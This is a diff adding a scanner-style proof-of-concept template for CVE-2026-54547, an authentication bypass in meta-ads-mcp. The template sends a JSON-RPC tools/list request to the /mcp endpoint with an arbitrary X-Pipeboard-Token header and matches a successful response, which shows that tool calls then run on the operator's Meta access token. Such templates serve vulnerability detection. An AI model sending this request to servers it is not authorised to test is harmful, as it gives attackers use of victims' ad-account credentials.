@@ -1,0 +1,47 @@
+[info]
+author = "AVE"
+description = "通过发送任意值的 X-Pipeboard-Token 头绕过 AuthInjectionMiddleware 认证，使后续 MCP 工具调用使用运营商的 META_ACCESS_TOKEN 凭据执行"
+id = "POC-AVE-2026-0570"
+name = "meta-ads-mcp X-Pipeboard-Token 认证绕过 PoC"
+severity = "high"
+tags = [
+    "cve-2026-54547",
+    "auth-bypass",
+    "cwe-287",
+]
+vuln_id = [
+    "CVE-2026-54547",
+    "GHSA-2v2f-mvfg-ph56",
+    "AVE-2026-0570",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/mcp"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}'
+type = "raw"
+
+[poc.requests.headers]
+Accept = "application/json, text/event-stream"
+Content-Type = "application/json"
+X-Pipeboard-Token = "attacker-controlled-not-validated"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "jsonrpc",
+    "tools",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
